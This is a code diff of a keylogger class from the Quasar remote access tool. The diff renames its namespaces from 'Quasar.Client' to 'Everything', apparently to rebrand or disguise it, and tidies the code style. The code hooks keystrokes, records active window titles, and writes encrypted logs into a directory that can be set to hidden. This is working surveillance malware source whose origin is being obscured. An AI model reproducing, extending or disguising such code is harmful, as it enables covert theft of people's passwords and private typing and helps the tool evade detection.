@@ -1,7 +1,7 @@
-﻿using Quasar.Client.Config;
-using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
-using Quasar.Client.MouseKeyHook;
+﻿using Everything.Config;
+using Everything.Extensions;
+using Everything.Helper;
+using Everything.MouseKeyHook;
 using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
 using System;
@@ -14,7 +14,7 @@ using System.Web;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
-namespace Quasar.Client.Logging
+namespace Everything.Logging
 {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
@@ -51,7 +51,7 @@ namespace Quasar.Client.Logging
         /// Saves the last window title of an application.
         /// </summary>
         private string _lastWindowTitle = string.Empty;
-        
+
         /// <summary>
         /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
         /// </summary>
@@ -148,13 +148,13 @@ namespace Quasar.Client.Logging
         /// <remarks>This event handler is called first.</remarks>
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
-            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
+            var activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
-                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - " 
-                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo) 
+                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
+                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
+                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
                     + " UTC</b>]</p><br>");
             }
 
@@ -236,10 +236,11 @@ namespace Quasar.Client.Logging
         /// <returns>The highlighted special keys.</returns>
         private string HighlightSpecialKeys(Keys[] keys)
         {
-            if (keys.Length < 1) return string.Empty;
+            if (keys.Length < 1)
+                return string.Empty;
 
-            string[] names = new string[keys.Length];
-            for (int i = 0; i < keys.Length; i++)
+            var names = new string[keys.Length];
+            for (var i = 0; i < keys.Length; i++)
             {
                 if (!_ignoreSpecialKeys)
                 {
@@ -257,15 +258,16 @@ namespace Quasar.Client.Logging
 
             if (_pressedKeys.ContainsModifierKeys())
             {
-                StringBuilder specialKeys = new StringBuilder();
+                var specialKeys = new StringBuilder();
 
-                int validSpecialKeys = 0;
-                for (int i = 0; i < names.Length; i++)
+                var validSpecialKeys = 0;
+                for (var i = 0; i < names.Length; i++)
                 {
                     _pressedKeys.Remove(keys[i]);
-                    if (string.IsNullOrEmpty(names[i])) continue;
+                    if (string.IsNullOrEmpty(names[i]))
+                        continue;
 
-                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
+                    specialKeys.AppendFormat(validSpecialKeys == 0 ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                     validSpecialKeys++;
                 }
 
@@ -277,12 +279,13 @@ namespace Quasar.Client.Logging
                 return specialKeys.ToString();
             }
 
-            StringBuilder normalKeys = new StringBuilder();
+            var normalKeys = new StringBuilder();
 
-            for (int i = 0; i < names.Length; i++)
+            for (var i = 0; i < names.Length; i++)
             {
                 _pressedKeys.Remove(keys[i]);
-                if (string.IsNullOrEmpty(names[i])) continue;
+                if (string.IsNullOrEmpty(names[i]))
+                    continue;
 
                 switch (names[i])
                 {
@@ -314,13 +317,13 @@ namespace Quasar.Client.Logging
         private void WriteFile()
         {
             // TODO: Add some house-keeping and delete old log entries
-            bool writeHeader = false;
+            var writeHeader = false;
 
-            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
+            var filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
 
             try
             {
-                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);
+                var di = new DirectoryInfo(Settings.LOGSPATH);
 
                 if (!di.Exists)
                     di.Create();
@@ -328,16 +331,14 @@ namespace Quasar.Client.Logging
                 if (Settings.HIDELOGDIRECTORY)
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
-                int i = 1;
+                var i = 1;
                 while (File.Exists(filePath))
                 {
                     // Large log files take a very long time to read, decrypt and append new logs to,
                     // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
-                    long length = new FileInfo(filePath).Length;
+                    var length = new FileInfo(filePath).Length;
                     if (length < _maxLogFileSize)
-                    {
                         break;
-                    }
 
                     // append a number to the file name
                     var newFileName = $"{Path.GetFileName(filePath)}_{i}";
@@ -348,7 +349,7 @@ namespace Quasar.Client.Logging
                 if (!File.Exists(filePath))
                     writeHeader = true;
 
-                StringBuilder logFile = new StringBuilder();
+                var logFile = new StringBuilder();
 
                 if (writeHeader)
                 {
@@ -362,9 +363,7 @@ namespace Quasar.Client.Logging
                 }
 
                 if (_logFileBuffer.Length > 0)
-                {
                     logFile.Append(_logFileBuffer);
-                }
 
                 FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);
 
